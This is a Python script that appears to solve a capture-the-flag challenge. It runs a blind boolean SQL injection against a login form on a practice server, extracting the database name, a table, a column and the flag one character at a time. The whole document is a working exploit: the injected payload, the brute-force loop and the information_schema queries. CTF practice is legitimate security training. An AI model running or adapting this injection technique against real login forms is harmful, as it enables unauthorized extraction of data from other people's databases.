import requests

def data(sql):
    result = ""
    for i in range(1, 50):
        for ascii_code in range(32, 127):
            payload = f"normaltic' or ascii(substr(({sql}),{i},1))={ascii_code} and '1'='1"
            data = {"UserId": payload, "Password": "1234", "Submit": "Login"}
            r = requests.post("http://ctf2.segfaulthub.com:7777/sqli_3/login.php", data=data, allow_redirects=False)
            if r.status_code == 200:
                result += chr(ascii_code)
                print(chr(ascii_code), end='')
                break
        else:
            break
    return result

print("DB: ")
db = data("database()")
print("\n")
print("Table: ")
table = data(f"select table_name from information_schema.tables where table_schema='{db}' limit 0,1")
print("\n")
print("Column:")
col = data(f"select column_name from information_schema.columns where table_name='{table}' limit 0,1")
print("\n")
print("Flag:")
flag = data(f"select {col} from {table} limit 0,1")
print("\n")
print(f"Flag → {flag}")
